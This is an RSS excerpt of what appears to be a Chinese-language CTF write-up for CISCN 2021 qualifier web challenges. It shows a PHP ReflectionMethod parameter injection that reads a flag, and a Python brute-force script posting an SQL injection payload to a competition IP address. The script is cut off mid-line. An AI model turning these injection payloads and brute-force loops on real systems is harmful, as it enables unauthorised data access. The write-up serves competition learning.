channel.title: ReflectionMethod on wh1sper
channel.description: Recent content in ReflectionMethod on wh1sper

item.title: CISCN 2021 Quals Writeup web
item.description: 就发下web的，所有wp戳这里->第十四届全国大学生信息安全竞赛初赛 Writeup by X1cT34m Web easy_source 原题，ReflectionMethod 构造 User 类中的函数方法，再通过 getDocComment 获取函数的注释 https://r0yanx.com/2020/10/28/fslh-writeup/ 提交参数： ?rc=ReflectionMethod&ra=User&rb=a&rd=getDocComment 爆破rb的值a-z，在q得到flag： CISCN{fvsgF-5rRwf-p8KZP-vOndu-SIQoM-} easy_sql fuzz： sqlmap得到表名flag和一个列名id：报错加无列名注入 一开始用按位比较： import requests url = 'http://124.70.35.238:23511/' def add(flag): res = '' res += flag return res flag = '' for i in range(1,200): for char in range(32, 127): hexchar = add(flag + chr(char)) payload = "1') or (select 1,'NO','CISCN{JGHHS-JPD52-IJK4O-MGPDZ-DUFWI-')>=(select * from security.flag limit 1)#".format(hexchar) data = {"uname":"admin",'passwd':payload} r = requests.post(url=url, data=data) text = r.
